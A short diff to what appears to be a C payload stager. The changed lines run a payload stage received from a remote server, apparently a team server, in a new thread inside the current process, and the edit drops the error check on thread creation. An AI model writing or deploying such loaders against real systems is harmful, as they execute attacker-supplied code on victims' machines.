@@ -608,12 +608,7 @@ void main(int argc, char* argv[])
 	}
 	debug_print("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
-	if (hThread == NULL)
-	{
-		debug_print("%s", "CreateThread failed\n");
-		exit(1);
-	}
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 
 	debug_print("%s", "Thread Created, payload received intact\n");
 
